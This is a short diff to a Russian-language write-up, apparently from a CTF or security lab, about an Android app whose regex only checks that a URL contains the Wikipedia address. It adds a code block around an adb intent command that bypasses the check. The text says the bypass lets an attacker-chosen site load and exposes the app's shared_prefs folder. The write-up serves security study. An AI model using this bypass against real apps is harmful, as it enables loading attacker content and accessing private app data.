@@ -5,7 +5,9 @@
 В коде уязвимая регулярка которая просто проверяет на наличие в строке https://en.wikipedia.org
 ![image](https://github.com/ambushidozho/casino/assets/102957421/b3aad247-f8bb-4bc5-ab12-5da175033760)
 Следовательно 
+```sh
 adb shell am start -n ru.vk.nsa/ru.vk.nsa.Wiki --es url https://vk.com?test='https://en.wikipedia.org'
+```
 с помощью такого интента мы можем поместить ссылку на любой сайт злоумышленника а также получить доступ к папке shared_pref
 
 ## Casino
